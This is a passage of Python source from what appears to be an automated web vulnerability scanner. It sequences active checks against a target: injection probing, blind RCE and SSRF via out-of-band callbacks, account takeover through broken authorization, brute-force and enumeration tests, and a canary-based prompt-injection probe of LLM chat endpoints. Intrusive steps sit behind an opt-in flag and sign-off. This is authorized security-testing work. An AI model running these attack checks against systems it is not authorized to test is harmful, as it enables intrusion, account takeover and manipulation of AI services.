                        try:
                            suggestions = self.confirm_graphql_suggestions(
                                gurl, introspection_open=introspects)
                        except Exception:
                            pass
                    hits = sum((introspects, batched, suggestions))
                    if hits:
                        confirmed += hits
                        break

            # 4) COLLECTION endpoints — ask what the app hands to a stranger. Routes
            #     WITHOUT a path parameter are the listings, and a listing is where bulk
            #     data leaks. One credential-free GET each.
            for route in list(getattr(self.surface, "api_routes", []) or []):
                if self._confirm_budget <= 0 or self._rate_limited:
                    break
                if self._PATH_PARAM_RE.search(route):
                    continue                    # an item, not a listing
                url = route if route.startswith("http") else _urljoin(base_origin, route)
                if url in exposure_checked:
                    continue
                exposure_checked.add(url)
                try:
                    self._covered("Unauthenticated exposure",
                                  note="collection endpoints, asked anonymously")
                    if self.confirm_data_exposure(url):
                        confirmed += 1
                except Exception:
                    pass

            # 3) GET query parameters
            for base, names in list(self.surface.params.items()):
                for p in list(names):
                    if tried >= max_params:
                        break
                    tried += 1
                    enqueue(base, p)
            # 4) FORM fields — test each user-controllable input with the form's method,
            #    filling the other fields so the request is well-formed (POST-based SQLi/
            #    cmdi/XSS the query-only pass misses).
            for form in list(getattr(self.surface, "forms", [])):
                action = getattr(form, "action", "") or self.target
                method = (getattr(form, "method", "GET") or "GET").upper()
                fields = [(n, t) for n, t in getattr(form, "inputs", ())]
                testable = [n for n, t in fields if t.lower() not in ("submit", "hidden", "file")]
                for field in testable:
                    if tried >= max_params:
                        break
                    tried += 1
                    others = {n: "1" for n, t in fields if n != field and t.lower() != "file"}
                    enqueue(action, field, method=method, extra=others)
                # A file input was excluded above because no delivery mode could carry
                # one — so the sinks that live behind an upload (deserialization of an
                # imported blob, upload handling itself) were unreachable by
                # construction, however good the detector. `_probe` has a MULTIPART mode
                # now, and this is what puts the parameter in front of it.
                #
                # Intrusive-gated on the same reasoning as mass assignment: an upload
                # WRITES to the target, and a default run stays read-only in effect.
                if self.allow_intrusive:
                    for fname, ftype in fields:
                        if ftype.lower() != "file" or tried >= max_params:
                            continue
                        tried += 1
                        others = {n: "1" for n, t in fields
                                  if n != fname and t.lower() != "file"}
                        enqueue(action, fname, method="MULTIPART", extra=others)
            # 4b) CONCRETE numeric path ids — /data/1. Templated `{id}` routes below only
            #     exist when a spec was found; a crawled app without one presents the id
            #     as a literal segment, and nothing recognised it, so the access-control
            #     differential never saw the endpoint while the coverage table counted it
            #     as seen. Enqueued as a PATH probe so it rides the SAME machinery.
            _pages = list(getattr(self.surface, "pages", {}) or {})
            for _tpl, _pp, _observed in self.id_addressed_endpoints(_pages):
                if tried >= max_params:
                    break
                tried += 1
                enqueue(_tpl, _pp, method="PATH", extra={"_observed_id": _observed})

            # 5) REST PATH parameters — /users/v1/{username}. On an API this is where the
            #    object identifier lives, so injection and broken object-level authz
            #    concentrate here, and nothing above reaches it: there is no query string
            #    and no form to find. Every existing proof applies unchanged; only the
            #    injection point moves from the query to a path segment.
            for route in list(getattr(self.surface, "api_routes", []) or []):
                if self._confirm_budget <= 0 or self._rate_limited:
                    return confirmed
                m = re.search(r"\{[^{}/]{1,40}\}", route)
                if not m:
                    continue                    # no path parameter to vary
                if self._is_destructive_path(route):
                    continue                    # state-changing despite the method
                url = route if route.startswith("http") else _urljoin(base_origin, route)
                if url in probed:
                    continue
                probed.add(url)
                enqueue(url, m.group(0), method="PATH")
                # Object authorization: the parent collection often lists objects next to
                # their owners, which is everything a cross-account read needs.
                if self.has_session() and confirmed_bola[0] is False:
                    collection = url.split(m.group(0))[0].rstrip("/")
                    try:
                        self._covered("Object-level authz (BOLA)",
                                      note="another principal's object, from the listing")
                        if self.confirm_bola_from_collection(
                                collection, url, m.group(0), self.session_token(),
                                self.identity):
                            confirmed += 1
                            confirmed_bola[0] = True
                    except Exception:
                        pass

            # 6) AI / LLM endpoints — a chat API on a SPA has neither a form nor a query
            #    parameter, so it is reachable only as a mined route. Its body field name
            #    isn't discoverable either: try the handful the ecosystem actually uses.
            for url in self._ai_endpoints():
                if url in probed or self._confirm_budget <= 0:
                    continue
                probed.add(url)
                for field in ("query", "message", "prompt", "input", "text", "q"):
                    if self._confirm_budget <= 0:
                        break
                    try:
                        self._covered("Prompt injection (LLM)", note="two-canary probe")
                        if self.confirm_prompt_injection(url, field, method="JSON"):
                            confirmed += 1
                            break
                    except Exception:
                        pass

            # 6b) MINED API ROUTES with no template and no known parameters. On a
            #     single-page app this is the ENTIRE injection surface: the crawl finds
            #     no forms and no query parameters, so without this the injection checks
            #     never execute and their absence from the coverage table is the only
            #     trace. Parameters are discovered by differential first, so the
            #     expensive probes only run against parameters that exist.
            #     Runs LAST of the probing passes: up to six discovery requests per
            #     route is the most expensive thing here, and starving the one-request
            #     prompt-injection check ahead of it lost findings in the e2e tests.
            for route in (getattr(self.surface, "api_routes", []) or [])[:12]:
                if self._confirm_budget <= 0 or self._rate_limited:
                    break
                if "{" in route or "?" in route:
                    continue          # templated routes are covered by the path sweep
                url = route if route.startswith("http") else _urljoin(base_origin, route)
                if url in probed or self._is_destructive_path(url):
                    continue
                try:
                    names = self.discover_params(url, budget=6)
                except Exception:
                    continue
                for name in names[:2]:
                    probed.add(url)
                    enqueue(url, name, method="GET")

            # 6c) PROBE what the sweeps collected: the two highest-severity classes
            #     against every endpoint first, then the rest with whatever survives.
            #     Both loops stop at `probe_floor` so the authorization and enumeration
            #     checks below are always reached.
            for _tier in (tier1, tier2):
                for _t, _p, _m, _x in queue:
                    if self._confirm_budget <= probe_floor or self._rate_limited:
                        break
                    if (_t, _p, _m) in settled:
                        continue
                    probe(_t, _p, method=_m, extra=_x, run_checks=_tier)

            # 6d) BLIND injection, out-of-band. Written, tested, and never invoked from
            #     the autonomous path — the third dead detector in this file. They cost
            #     nothing where there is no listener (`_oob()` returns None in the fake
            #     cage and both simply decline), and blind SSRF/RCE is precisely the
            #     class an in-band differential cannot reach: the server makes the
            #     request or runs the command and tells you nothing.
            if self._oob() is not None:
                _oob_found = False
                for _t, _p, _m, _x in queue[:4]:
                    if (_oob_found or self._confirm_budget <= probe_floor
                            or self._rate_limited):
                        break
                    self._covered("Blind injection (out-of-band)",
                                  note="callback to Brukal's in-cage listener")
                    self._covered("Insecure deserialization",
                                  note="gadget shapes, proved by an OOB callback")
                    # One try PER detector. Chained under a single `except`, a throw in
                    # an earlier probe silently cancelled every later one — so blind RCE
                    # failing on an unrelated error made deserialization unreachable
                    # while both still reported themselves as covered. Three classes
                    # sharing one swallow is three classes that can vanish together.
                    for _fn in (self.confirm_blind_ssrf, self.confirm_blind_rce,
                                self.confirm_deserialization_rce):
                        try:
                            if _fn(_t, _p, method=_m, extra=_x):
                                confirmed += 1
                                _oob_found = True
                                break
                        except Exception:
                            continue

            # 7) MASS ASSIGNMENT — last, because it is the only proof that WRITES to the
            #    target, and so the only one an operator must opt into (--full-send sets
            #    allow_intrusive; confirm_mass_assignment refuses without it). Running it
            #    here is what closes the gap between a detector existing and the
            #    autonomous path ever using it.
            if self.allow_intrusive and self._confirm_budget > 0 and not self._rate_limited:
                targets = self.mass_assignment_targets()
                if targets:
                    try:
                        self._covered("Mass assignment", note="control-account differential")
                        if self.confirm_mass_assignment(*targets):
                            confirmed += 1
                    except Exception:
                        pass
                # NB: the field-injection sinks (object mass-assignment, SSRF, NoSQL) used
                # to live here, LAST — and under the scope rate limit the earlier per-route
                # sweeps hit the wall first, so those cheap high-value probes (crAPI
                # #8/#9/#10/#11/#12) never ran (2026-09-26 A/B: 36 web-rate DENYs, 0 sink
                # payloads sent). They are hoisted to run early instead (see below, right
                # after the protected-routes pass), per the file's own law: a rate wall
                # must cost the expensive sweeps, not the one-request checks that carry the
                # most signal.

                # 8) BFLA — the write-side of authorization. BOLA (pass 5) proves we can
                #    READ another principal's object; this proves we can ACT on it. A
                #    target can pass the read check and still be trivially takeoverable,
                #    so the two are not substitutes.
                # Credential handling and signup abuse — both need a self-service
                # create, which mass_assignment_targets() already located.
                if targets and self._confirm_budget > 0:
                    reg_url, _login_u, _verify = targets
                    self._covered("Credential storage",
                                  note="planted password, looked for it coming back")
                    exposures = [u for u in
                                 [self._absolute_route(r) for r in
                                  (getattr(self.surface, "api_routes", []) or [])]
                                 if u and any(w in u.lower()
                                              for w in ("debug", "user", "account"))][:4]
                    try:
                        if self.confirm_plaintext_password_storage(reg_url, exposures):
                            confirmed += 1
                    except Exception:
                        pass
                    self._covered("Signup abuse", note="repeated account creation")
                    try:
                        if self.confirm_unthrottled_registration(reg_url):
                            confirmed += 1
                    except Exception:
                        pass

                bfla = self.bfla_targets()
                if bfla and self._confirm_budget > 0:
                    change_tpl, login_url, victim = bfla
                    try:
                        self._covered("Function-level authz (BFLA)",
                                      note="proof is a login as the victim")
                        if self.confirm_bfla_password_takeover(
                                change_tpl, login_url, victim, self.session_token()):
                            confirmed += 1
                    except Exception:
                        pass

                # 8b) A state-destroying endpoint that answers strangers. Proved by
                #     OPTIONS differential, never by invoking it — see the method.
                protected_ref = ""
                for _m, spath in (getattr(self.surface, "protected_routes", []) or []):
                    if "{" not in spath:
                        protected_ref = (spath if spath.startswith("http")
                                         else _urljoin(base_origin, spath))
                        break
                if protected_ref:
                    for route in (getattr(self.surface, "api_routes", []) or []):
                        if self._confirm_budget <= 0:
                            break
                        if not self._is_destructive_path(route):
                            continue
                        durl = (route if route.startswith("http")
                                else _urljoin(base_origin, route))
                        try:
                            if self.confirm_destructive_endpoint_exposed(durl,
                                                                        protected_ref):
                                confirmed += 1
                                break
                        except Exception:
                            pass

                # 8c) Sessions surviving a credential change — an ABSENCE finding.
                if bfla and self._confirm_budget > 0 and self.identity:
                    change_tpl, login_url_, _victim = bfla
                    verify = self._login_endpoint().replace("login", "me") \
                        if self._login_endpoint() else ""
                    for cand in ([verify] if verify else []) + [
                            _urljoin(base_origin, "/me")]:
                        try:
                            if self.confirm_no_session_revocation(
                                    change_tpl, login_url_, cand,
                                    self.identity, self._login_password):
                                confirmed += 1
                                break
                        except Exception:
                            pass

                # 9) Unthrottled credential brute-force. Intrusive by consequence rather
                #    than by method: on a target with lockout, repeated failures deny
                #    service to a real account.
                login_url = self._login_endpoint()
                if login_url and self.identity and self._confirm_budget > 0:
                    try:
                        if self.confirm_missing_rate_limit(login_url, self.identity):
                            confirmed += 1
                    except Exception:
                        pass

            # 10) Username enumeration. Read-only, so it runs whether or not intrusive
            #     actions were authorised — but it needs an account we KNOW exists to
            #     compare against, which in practice means we logged in.
            login_url = self._login_endpoint()
            if (login_url and self.identity and self._confirm_budget > 0
                    and not self._rate_limited):
                try:
                    self._covered("Authentication posture",
                                  note="enumeration + throttling differentials")
                    if self.confirm_user_enumeration(login_url, self.identity):
                        confirmed += 1
                except Exception:
                    pass
            return confirmed
        finally:
            spent_out = (self._confirm_budget is not None and self._confirm_budget <= 0)
            self._confirm_budget = None       # standalone confirm_* calls stay unbounded
            if spent_out:
                # Same hazard as the rate wall: past the budget every remaining check
                # returns nothing, which reads exactly like "not vulnerable".
                self.notes.append(
                    "[coverage] the active-confirmation request budget ran out — later "
                    "checks did NOT run, so their silence is not a clean result.")
                self.highlights.append(
                    ("coverage", "active confirmation hit its request budget"))

    def web_probes(self, max_active: int = 12):
        """Deterministic vuln-probe checklist for the crawled surface (empty if not
        yet crawled). Passive probes (whatweb/nuclei/nikto) auto-run through the gate;
        active probes (sqlmap/dalfox) are attack-grade and ESCALATE for sign-off (or
        run under --full-send). The gate — not this list — is the authority."""
        if self.surface is None or not self.surface.pages:
            return []
        from . import webprobe
        return webprobe.plan_probes(self.surface, self.target, max_active=max_active)

    def _probe_suggestions_text(self, limit: int = 8) -> str:
        """The active (attack-grade) probes, offered to the planner as concrete next
        moves against REAL mapped parameters/forms — so the model proposes targeted
        injection tests instead of guessing. Each still passes through the gate and
        ESCALATEs (or runs under --full-send); this is a suggestion, not execution."""
        active = [p for p in self.web_probes() if p.category == "active"]
        if not active:
            return ""
        lines = ["SUGGESTED ACTIVE PROBES (each tests a real mapped parameter/form; "
                 "needs sign-off or --full-send):"]
        for p in active[:limit]:
            lines.append(f"- {p.command}   # {p.rationale}")
        return "\n".join(lines)
